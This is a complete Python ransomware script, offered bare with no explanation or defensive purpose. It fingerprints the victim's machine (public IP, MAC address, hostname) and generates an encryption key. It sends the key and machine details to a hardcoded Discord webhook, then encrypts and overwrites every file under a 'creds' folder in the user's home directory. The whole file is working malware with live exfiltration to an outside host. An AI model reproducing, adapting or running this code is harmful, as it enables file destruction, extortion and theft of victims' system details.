import json
from cryptography.fernet import Fernet
import os
import glob
import requests, getmac
import random
import json
#rom socket import gethostnames
from _socket import gethostname

ip = requests.get("https://api.ipify.org", headers={'User-Agent':'google.com'})
wh_url = "https://discord.com/api/webhooks/1005414946823225354/-ZIlxnTUsigXmvyqOkOu1_5ESSOJYdqFmbqO7AFk3fLg54jKvcra_CYfcCPZ6yaxMwhE"
mac= getmac.get_mac_address()

home_dir =  os.path.expanduser("~")
key = Fernet.generate_key()

webhook_data = {"username": "BotName", "embeds": [
    dict(title="Encrypted a System.",
         color=f'{random.randint(0, 0xFFFFFF)}',
         fields=[
             {
                 "name": "**E/D Key**",
                 "value": f'||{key}||',
                 "inline": True
             },
             {
                 "name": "**IP Address**",
                 "value": f'||`{ip.text}`||',
                 "inline": True
             },
             {
                 "name": "**PC info**",
                 "value": f"mac: ||`{mac}`|| \nPC name: `{gethostname()}`",
                 "inline": True

             },
         ]),
]}

requests.post(wh_url, data=json.dumps(webhook_data), headers={'Content-Type':'application/json'})

with open("key.key", "wb") as keyFile:
    keyFile.write(key)

files = glob.glob(f'{home_dir}\\creds\\**\\*.*', recursive=True)
fernet = Fernet(key)
for file in files:
   with open(file, "rb") as tf:
       tf_byte = tf.read()

   tf_bytes_enc = fernet.encrypt(tf_byte)

   with open(file, "wb") as tf:
        tf.write(tf_bytes_enc)

#print(home_dir)

#for file in files:
   # print(file)